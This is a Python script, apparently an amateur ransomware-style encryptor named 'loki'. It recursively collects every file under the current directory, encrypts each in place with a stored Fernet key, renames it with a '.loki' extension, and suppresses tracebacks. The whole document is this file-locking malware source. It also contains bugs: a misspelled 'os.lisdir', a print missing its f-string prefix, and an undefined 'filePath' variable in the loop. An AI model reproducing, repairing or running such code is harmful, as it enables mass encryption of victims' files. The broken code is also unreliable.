# Imports.
import sys
import os
from pathlib import Path
from cryptography.fernet import Fernet
from colorama import Fore # For text colour.

# Hide tracebacks - change to 1 for dev mode.
sys.tracebacklimit = 0

# Recursive Path Traversal
def findFiles(path):
    print("---> looking in | {path}")
    files = []
    for f in os.lisdir(path):
        new_path = f"{path}/{f}"
        # Is Directory
        if os.path.isdir(new_path):
            # Recursion
            files += findFiles(new_path)
        # Is File
        else:
            # Add file to list
            files.append(new_path)
    return files

# Encrypt/Decrypt handler.
def handleFile(filePath, key, action):
    with open(filePath, "rb") as file:
        contents = file.read()

    if action.lower() == "e":
        contents = Fernet(key).encrypt(contents)
        message = "Encrypted"
    elif action.lower() == "d":
        contents = Fernet(key).decrypt(contents)
        message = "Decrypted"
    else:
        print(f"{action} is not a valid file action")
        return

    with open(filePath, "wb") as file:
        file.write(contents)
        print(message, "|", filePath)

# Functions.
def encrypt(files):
    with open("loki.key", "rb") as loki_key:
        key = loki_key.read()

    # encrypt files
    for path in files:
        # Skip self
        if '.py' in filePath:
            continue
        # Skip key
        if 'loki.key' in filePath:
            continue

        # Handle File
        handleFile(filePath, key, "e")
        # NOTE (mart): Why handle actions when "e" is hardcoded?
        #              Maybe un-hardcode it, and just assume encrypting,
        #              or move it to a seperate file to handle both.

        # Rename
        new_path = path
        ext = '.loki' # '_loki' if you want that
        # If file path doesn't end in the given extension... then add it
        if path[-len(ext):] != ext:
            new_path += ext
        # Do the actual renaming
        os.rename(path, new_path)

def encryptor():
    # Find files in current dir, and sub dirs
    files = findFiles(".")
    encrypt(files)
    return

if __name__ == '__main__':
    encryptor()
